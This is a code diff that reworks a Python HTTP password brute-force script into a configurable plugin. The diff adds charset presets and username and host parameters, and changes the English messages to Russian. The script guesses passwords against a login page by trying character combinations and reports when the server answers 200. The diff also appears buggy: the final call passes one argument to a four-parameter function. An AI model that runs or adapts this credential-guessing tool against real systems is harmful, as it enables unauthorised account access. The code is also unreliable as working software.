@@ -1,5 +1,3 @@
-__author__ = 'mine_bit'
-
 import sys
 import time
 import base64
@@ -8,12 +6,52 @@ import string
 import httplib2
 
 
-def afunction(password_start):
-    # -------------------------------------------------------------------------- ONLY ONCE
-    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    h = httplib2.HTTP('192.168.178.25')
+# -*- coding: utf-8 -*-
+# Coded by Mine_Bit[BrainHands]
+# brainhands.ru
+# mine_bit@brainhands.ru
+
+# Системные переменные:
+__name__ = 'http_bruteforse'
+__author__ = 'Mine_Bit'
+__file__ = 'http_bruteforse.py'
+__package__ = 'plugins'
+
+# Список чарсетов:
+LOWER_ALFA = 'abcdefghijklmnopqrstuvwxyz'
+UPPER_ALFA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+LOWER_ALFA_NUMERIC = 'abcdefghijklmnopqrstuvwxyz0123456789'
+UPPER_ALFA_NUMERIC = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+MIXED_ALFA = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+MIXED_ALFA_NUMERIC = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+FULL_CHARSET = MIXED_ALFA_NUMERIC + '~!@#$%^&*()_+=-][{}\';:"\\|/><,.'
+
+
+def http_bruteforse(username, charset, host, password_start):
+    # Настройка параметров:
+    # ==Настройка чарсета======================================================================
+    if charset is '0':
+        charset = LOWER_ALFA
+    elif charset is '1':
+        charset = UPPER_ALFA
+    elif charset is '2':
+        charset = LOWER_ALFA_NUMERIC
+    elif charset is '3':
+        charset = UPPER_ALFA_NUMERIC
+    elif charset is '4':
+        charset = MIXED_ALFA
+    elif charset is '5':
+        charset = MIXED_ALFA_NUMERIC
+    elif charset is '6':
+        charset = FULL_CHARSET
+    else:
+        print('[Ошибка] Набор символов не настроен!')
+        sys.exit(1)
+    # =========================================================================================
+
+    h = httplib2.HTTP(host)
     num = len(charset) ** 2
-    print("Trying to crack parse.html...\n")
+    print("Пробуем взломать parse.html...\n")
 
     # STATUS VARIABLES
     totspeed = 0
@@ -30,7 +68,7 @@ def afunction(password_start):
                 ilist.append(index)
 
     # USERNAME
-    userid = 'admin'
+    userid = username
 
     # -------------------------------------------------------------------------- LOOP
     for idx, l in enumerate(charset):
@@ -65,10 +103,10 @@ def afunction(password_start):
                         if h.getreply()[0] == 401:
                             continue
                         elif h.getreply()[0] == 200:
-                            print("Login succes!!  Username: %s" % userid, "   Password: %s" % passwd)
+                            print("[ВНИМАНИЕ] Комбинация найдена!  Логин: %s" % userid, "   Пароль: %s" % passwd)
                             sys.exit()
                         else:
-                            print("Conncection lost...")
+                            print('[Ошибка] Соединение потеряно!')
                             sys.exit()
 
                 # STATUS UPDATE
@@ -90,7 +128,11 @@ def afunction(password_start):
                       "  Estimated time left: %d hours" % estimatation, "::::", "  Passwords Left: %d" % passwordsleft,
                       "::::", "  Done: %.2f %%" % (100 - (((passwordsleft / total)) * 100)))
 
-    print("No password found.. Try something else.... ")
+    print("[Ошибка] Пароли не найдены! Попробуйте что-нибудь еще!")
 
 # RUN SCRIPT
-afunction('aaiaa')
+def run_http_bruteforse():
+    pass
+
+
+http_bruteforse('aaiaa')
